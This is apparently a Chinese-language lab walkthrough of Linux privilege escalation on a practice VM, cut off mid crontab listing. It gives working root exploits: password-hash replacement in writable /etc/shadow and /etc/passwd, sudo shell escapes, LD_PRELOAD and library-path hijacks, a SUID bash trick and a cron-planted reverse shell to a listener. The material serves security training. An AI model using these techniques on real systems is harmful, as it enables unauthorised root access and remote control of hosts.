+<p>/etc/shadow 文件包含用户密码哈希，通常只能由 root 用户读取。</p>
+<p>请注意，VM 上的 /etc/shadow 文件是全局可写的：</p>
+<p>​<code>ls -l /etc/shadow</code>​</p>
+<p>使用您选择的密码生成新密码哈希：</p>
+<p>​<code>mkpasswd -m sha-512 “你的密码”</code>​</p>
+<p>编辑 /etc/shadow 文件并将原始 root 用户的密码哈希替换为您刚刚生成的密码。</p>
+<p>切换到 root 用户，使用新密码：</p>
+<p>​<code>su root</code>​</p>
+<p>另一种同样利用方式</p>
+<p>/etc/passwd 文件包含有关用户帐户的信息。它是全局可读的，但通常只能由 root 用户写入。从历史上看，/etc/passwd 文件包含用户密码哈希值，某些版本的 Linux 仍然允许将密码哈希值存储在那里。</p>
+<p>请注意，/etc/passwd 文件是全局可写的：</p>
+<p>​<code>ls -l /etc/passwd</code>​</p>
+<p>使用您选择的密码生成新密码哈希：</p>
+<p>​<code>openssl passwd “你的新密码”</code>​</p>
+<p>编辑 /etc/passwd 文件并将生成的密码散列放在根用户行的第一个和第二个冒号 (:) 之间（替换“x”）。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ openssl passwd open123456
+</span></span><span style="display:flex;"><span>Warning: truncating password to <span style="color:#ae81ff">8</span> characters
+</span></span><span style="display:flex;"><span>P1kI55UCjXLJM
+</span></span></code></pre></div><p>切换到 root 用户，使用新密码：</p>
+<p>​<code>su root</code>​</p>
+<p>或者，复制 root 用户的行并将其附加到文件底部，将单词“root”的第一个实例更改为“newroot”并将生成的密码哈希 放在第一个和第二个冒号之间（替换“x”） .</p>
+<p>现在切换到 newroot 用户，使用新密码：</p>
+<p>​<code>su newroot</code>​</p>
+<h1 id="0x4-shell转义序列">0x4 shell转义序列<a href="#0x4-shell转义序列" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>列出 sudo 允许您的用户运行的程序：</p>
+<p>​<code>sudo -l</code>​</p>
+<p>访问 GTFOBins ( <a href="https://gtfobins.github.io/">https://gtfobins.github.io</a> ) 并搜索一些程序名称。如果程序以“sudo”作为函数列出，您可以使用它来提升权限，通常是通过转义序列。</p>
+<p>从列表中选择一个程序并尝试使用 GTFOBins 中的说明获取 root shell</p>
+<p>首先我们执行sudo -l查看</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> user on this host:
+</span></span><span style="display:flex;"><span>    env_reset, env_keep<span style="color:#f92672">+=</span>LD_PRELOAD, env_keep<span style="color:#f92672">+=</span>LD_LIBRARY_PATH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User user may run the following commands on this host:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/sbin/iftop
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/find
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/nano
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/vim
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/man
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/awk
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/less
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/ftp
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/nmap
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/sbin/apache2
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /bin/more
+</span></span></code></pre></div><h3 id="iftop">iftop<a href="#iftop" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>​<img src="https://s2.loli.net/2022/12/17/nG8jbfFeWoNxuU9.png" alt="">​</p>
+<p>打开GTFOBins，搜索第一个iftop，任何按照说明</p>
+<p>首先sudo iftop进入iftop，在命令行输入!/bin/sh</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ sudo iftop
+</span></span><span style="display:flex;"><span>interface: eth0
+</span></span><span style="display:flex;"><span>IP address is: 10.10.134.160
+</span></span><span style="display:flex;"><span>MAC address is: 02:7a:ce:e8:51:93
+</span></span><span style="display:flex;"><span>sh-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="find">find<a href="#find" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ sudo find . -exec /bin/sh <span style="color:#ae81ff">\;</span> -quit
+</span></span><span style="display:flex;"><span>sh-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="nano">nano<a href="#nano" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>​<img src="assets/image-20221216113001-bg68utu.png" alt="image"></p>
+<p>运行 <strong>sudo /usr/bin/nano</strong></p>
+<p>输入 <strong>Ctrl + R</strong> 然后 <strong>Ctrl + X</strong></p>
+<p>输入 <strong>reset; bash 1&gt;&amp;0 2&gt;&amp;0</strong></p>
+<h3 id="vim">vim<a href="#vim" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>vim要简单一点</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ sudo vim -c <span style="color:#e6db74">&#39;:!/bin/sh&#39;</span>
+</span></span><span style="display:flex;"><span>sh-4.1# ls
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>  myvpn.ovpn  tools
+</span></span><span style="display:flex;"><span>sh-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="man">man<a href="#man" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ sudo man man
+</span></span><span style="display:flex;"><span>sh-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>输入 sudo man man后输入! /bin/sh</p>
+<h3 id="awk">AWK<a href="#awk" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ sudo awk <span style="color:#e6db74">&#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39;</span>
+</span></span><span style="display:flex;"><span>sh-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="less">less<a href="#less" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ sudo less /etc/profile
+</span></span><span style="display:flex;"><span>sh-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="ftp">FTP<a href="#ftp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ sudo ftp
+</span></span><span style="display:flex;"><span>ftp&gt; !/bin/sh
+</span></span><span style="display:flex;"><span>sh-4.1# sudo ftp
+</span></span><span style="display:flex;"><span>ftp&gt; !/bin/sh
+</span></span><span style="display:flex;"><span>sh-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="nmap">nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ sudo nmap --interactive
+</span></span><span style="display:flex;"><span>Starting Nmap V. 5.00 <span style="color:#f92672">(</span> http://nmap.org <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Welcome to Interactive Mode -- press h &lt;enter&gt; <span style="color:#66d9ef">for</span> help
+</span></span><span style="display:flex;"><span>nmap&gt; ! sh
+</span></span><span style="display:flex;"><span>sh-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h2 id="heading"><a href="#heading" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ TERM<span style="color:#f92672">=</span> sudo more /etc/profile
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/profile: system-wide .profile file for the Bourne shell (sh(1))</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;`id -u`&#34;</span> -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>  PATH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  PATH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>export PATH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$PS1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$BASH<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># The file bash.bashrc already sets the default PS1.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># PS1=&#39;\h:\w\$ &#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -f /etc/bash.bashrc <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>      . /etc/bash.bashrc
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;`id -u`&#34;</span> -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>      PS1<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;# &#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>      PS1<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$ &#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>!/bin/sh   
+</span></span><span style="display:flex;"><span>sh-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h1 id="0x5-sudo">0x5 sudo<a href="#0x5-sudo" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Sudo 可以配置为从用户环境中继承某些环境变量。</p>
+<p>检查继承了哪些环境变量（查找 env_keep 选项）：</p>
+<p>​<code>sudo -l</code>​</p>
+<p>LD_PRELOAD 和 LD_LIBRARY_PATH 都是从用户环境继承而来的。 LD_PRELOAD 在程序运行时先加载一个共享对象。LD_LIBRARY_PATH 提供首先搜索共享库的目录列表。</p>
+<p>使用位于/home/user/tools/sudo/preload.c 的代码创建共享对象：</p>
+<p>​<code>gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</code>​</p>
+<p>运行允许通过 sudo 运行的程序之一（在运行<strong>sudo -l</strong>时列出），同时将 LD_PRELOAD 环境变量设置为新共享对象的完整路径：</p>
+<p>​<code>sudo LD_PRELOAD=/tmp/preload.so program-name-here</code>​</p>
+<p>应该产生一个root shell。在继续之前退出 shell。</p>
+<p>对 apache2 程序文件运行 ldd 以查看该程序使用了哪些共享库：</p>
+<p>​<code>ldd /usr/sbin/apache2</code>​</p>
+<p>使用位于 /home/user/tools/sudo/library_path.c 的代码创建一个与列出的库 (libcrypt.so.1) 同名的共享对象：</p>
+<p>​<code>gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</code>​</p>
+<p>使用 sudo 运行 apache2，同时将 LD_LIBRARY_PATH 环境变量设置为 /tmp（我们输出已编译的共享对象）：</p>
+<p>​<code>sudo LD_LIBRARY_PATH=/tmp apache2</code>​</p>
+<p>应该产生一个root shell。退出shell。尝试将 /tmp/libcrypt .so.1 重命名为 apache2 使用的另一个库的名称，然后再次使用 sudo 重新运行 apache2。</p>
+<p>​<img src="https://s2.loli.net/2022/12/17/3ikUorsZvbKa2ty.png" alt="">​</p>
+<p>首先我们sudo -l 查看</p>
+<p>在进入以下阶段是时候我参考了这两篇文章：<a href="https://jvns.ca/blog/2014/11/27/ld-preload-is-super-fun-and-easy/">LD_PRELOAD教程</a>，<a href="https://rafalcislak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">LD_PRELOAD2教程</a>，我们继续开始</p>
+<p>​<img src="assets/image-20221216120856-nkkxavn.png" alt="image"></p>
+<p>我们来解释一下这个过程，首先setresuid()设置调用进程的真实用户ID、有效用户ID和保存的set-user-ID，这些设置为0，属于ROOT用户ID，在 Preload.so中首先加载，因为它是用 LD_PRELOAD设置的<br>
+iftop已经设置了sudo权限，因此我们得到了一个 rootshell。</p>
+<p>接下里我们使用LD_LIBRARY_PATH</p>
+<p>​<img src="https://s2.loli.net/2022/12/17/Uu86syWcYdxHrke.png" alt="">​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ ldd /usr/sbin/apache2
+</span></span><span style="display:flex;"><span>        linux-vdso.so.1 <span style="color:#f92672">=</span>&gt;  <span style="color:#f92672">(</span>0x00007fff60bff000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        libpcre.so.3 <span style="color:#f92672">=</span>&gt; /lib/x86_64-linux-gnu/libpcre.so.3 <span style="color:#f92672">(</span>0x00007f9ea85e2000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        libaprutil-1.so.0 <span style="color:#f92672">=</span>&gt; /usr/lib/libaprutil-1.so.0 <span style="color:#f92672">(</span>0x00007f9ea83be000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        libapr-1.so.0 <span style="color:#f92672">=</span>&gt; /usr/lib/libapr-1.so.0 <span style="color:#f92672">(</span>0x00007f9ea8184000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        libpthread.so.0 <span style="color:#f92672">=</span>&gt; /lib/libpthread.so.0 <span style="color:#f92672">(</span>0x00007f9ea7f68000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/libc.so.6 <span style="color:#f92672">(</span>0x00007f9ea7bfc000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        libuuid.so.1 <span style="color:#f92672">=</span>&gt; /lib/libuuid.so.1 <span style="color:#f92672">(</span>0x00007f9ea79f7000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        librt.so.1 <span style="color:#f92672">=</span>&gt; /lib/librt.so.1 <span style="color:#f92672">(</span>0x00007f9ea77ef000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        libcrypt.so.1 <span style="color:#f92672">=</span>&gt; /lib/libcrypt.so.1 <span style="color:#f92672">(</span>0x00007f9ea75b8000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        libdl.so.2 <span style="color:#f92672">=</span>&gt; /lib/libdl.so.2 <span style="color:#f92672">(</span>0x00007f9ea73b3000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        libexpat.so.1 <span style="color:#f92672">=</span>&gt; /usr/lib/libexpat.so.1 <span style="color:#f92672">(</span>0x00007f9ea718b000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        /lib64/ld-linux-x86-64.so.2 <span style="color:#f92672">(</span>0x00007f9ea8a9f000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+</span></span><span style="display:flex;"><span>user@debian:~$ sudo LD_LIBRARY_PATH<span style="color:#f92672">=</span>/tmp apache2
+</span></span><span style="display:flex;"><span>apache2: /tmp/libcrypt.so.1: no version information available <span style="color:#f92672">(</span>required by /usr/lib/libaprutil-1.so.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>root@debian:/home/user# 
+</span></span><span style="display:flex;"><span>root@debian:/home/user# 
+</span></span><span style="display:flex;"><span>root@debian:/home/user# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>现在让我们尝试重命名<code>/tmp/libcrypt.so.1</code>​为<code>/tmp/libpcre.so.3</code>​used by apache2 并再次使用 sudo 重新运行 apache2 并让我们看看是否为我们提供了 root shell。</p>
+<p>​<img src="https://s2.loli.net/2022/12/17/nl3Rkf9OpQ5mI1w.png" alt="">​</p>
+<h1 id="0x6-cron-job">0x6 Cron job<a href="#0x6-cron-job" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Cron 作业是用户可以安排在特定时间或间隔运行的程序或脚本。Cron 表文件 (crontabs) 存储 cron 作业的配置。 系统范围的 crontab 位于 /etc/crontab。</p>
+<p>查看系统范围的crontab的内容：</p>
+<p>​<code>cat /etc/crontab</code>​</p>
+<p>每分钟应该有两个计划运行的 cron 作业。一个运行 overwrite.sh，另一个运行 /usr/local/bin/compress.sh。</p>
+<p>找到 overwrite.sh 文件的完整路径：</p>
+<p>​<code>locate overwrite.sh</code>​</p>
+<p>请注意，该文件是全局可写的：</p>
+<p>​<code>ls -l /usr/local/bin/overwrite.sh</code>​</p>
+<p>将IP 地址更改为您的 Kali 盒子的 IP 地址后，将overwrite.sh 文件的内容替换为 以下内容。</p>
+<p>#!/bin/bash<br>
+bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</p>
+<p>在端口 4444 上的 Kali 机器上设置一个 netcat 监听器并等待 cron 作业运行（不应超过一分钟）。根 shell 应该连接回您的 netcat 侦听器。如果它不重新检查文件的权限，是否缺少任何内容？</p>
+<p>​<code>nc -nvlp 4444</code>​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ser@debian:~$ cat /etc/crontab 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/crontab: system-wide crontab</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># command to install the new version when you edit this file</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and files in /etc/cron.d. These files also have username fields,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># that none of the other crontabs do.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SHELL<span style="color:#f92672">=</span>/bin/sh
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># m h dom mon dow user  command</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span> *    * * *   root    cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span> <span style="color:#ae81ff">6</span>    * * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.daily <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">6</span>    * * <span style="color:#ae81ff">7</span>   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">52</span> <span style="color:#ae81ff">6</span>    <span style="color:#ae81ff">1</span> * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>* * * * * root overwrite.sh
+</span></span><span style="display:flex;"><span>* * * * * root /usr/local/bin/compress.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user@debian:~$ locate overwrite.sh
+</span></span><span style="display:flex;"><span>locate: warning: database <span style="color:#e6db74">`</span>/var/cache/locate/locatedb<span style="color:#960050;background-color:#1e0010">&#39;</span> is more than <span style="color:#ae81ff">8</span> days old <span style="color:#f92672">(</span>actual age is 945.4 days<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/usr/local/bin/overwrite.sh
+</span></span><span style="display:flex;"><span>user@debian:~$ ls -l /usr/local/bin/overwrite.sh 
+</span></span><span style="display:flex;"><span>-rwxr--rw- <span style="color:#ae81ff">1</span> root staff <span style="color:#ae81ff">40</span> May <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2017</span> /usr/local/bin/overwrite.sh
+</span></span><span style="display:flex;"><span>user@debian:~$ 
+</span></span><span style="display:flex;"><span>user@debian:~$ vim overwrite.sh
+</span></span></code></pre></div><h2 id="第二cron-path环境变量">第二cron-PATH环境变量<a href="#第二cron-path环境变量" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>查看系统范围的crontab的内容：</p>
+<p>​<code>cat /etc/crontab</code>​</p>
+<p>请注意，PATH 变量以 <strong>/home/user</strong>开头，这是我们用户的主目录。</p>
+<p>使用以下内容在您的主目录中创建一个名为<strong>overwrite.sh的文件：</strong></p>
+<p>#!/bin/bash</p>
+<p>cp /bin/bash /tmp/rootbash<br>
+chmod +xs /tmp/rootbash</p>
+<p>确保该文件是可执行的：</p>
+<p>​<code>chmod +x /home/user/overwrite.sh</code>​</p>
+<p>等待 cron job运行起来。 使用 -p 运行 /tmp/rootbash 命令以获得以 root 权限运行的 shell：</p>
+<p>​<code>/tmp/rootbash -p</code>​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh user@10.10.131.192 -oHostKeyAlgorithms<span style="color:#f92672">=</span>+ssh-rsa
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.131.192 (10.10.131.192)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This host key is known by the following other names/addresses:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ~/.ssh/known_hosts:14: [hashed name]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ~/.ssh/known_hosts:15: [hashed name]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.131.192<span style="color:#e6db74">&#39; (RSA) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">user@10.10.131.192&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux debian 2.6.32-5-amd64 <span style="color:#75715e">#1 SMP Tue May 13 16:34:35 UTC 2014 x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Fri May <span style="color:#ae81ff">15</span> 06:41:23 <span style="color:#ae81ff">2020</span> from 192.168.1.125
+</span></span><span style="display:flex;"><span>user@debian:~$ cat /etc/crontab 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/crontab: system-wide crontab</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># command to install the new version when you edit this file</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and files in /etc/cron.d. These files also have username fields,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># that none of the other crontabs do.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SHELL<span style="color:#f92672">=</span>/bin/sh
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># m h dom mon dow user  command</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span> *    * * *   root    cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span> <span style="color:#ae81ff">6</span>    * * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.daily <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">6</span>    * * <span style="color:#ae81ff">7</span>   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style="color:#f92672">)</span>
